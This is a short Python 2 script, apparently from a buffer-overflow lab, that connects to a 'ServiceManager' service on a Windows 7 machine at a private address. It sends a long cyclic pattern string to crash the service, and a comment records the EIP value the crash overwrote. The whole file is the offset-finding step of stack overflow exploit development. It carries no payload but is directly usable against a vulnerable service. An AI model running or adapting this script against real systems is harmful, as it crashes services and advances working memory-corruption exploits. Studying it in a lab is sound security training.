#!/usr/bin/python
import socket

ServiceManagerIP = "10.0.2.15"
ServiceManagerPort = 42424

# EIP value as a result of running this script = 39654138

# Array of A's
buff = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2A"


#Attempt to send message
try:
    print "Sending buffer"
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    #Connect to Win7 machine
    connect = s.connect((ServiceManagerIP, ServiceManagerPort))
    s.send(buff + '\r\n')
    s.recv(1024)
    s.close()
    
except:
    print "Could not connect"
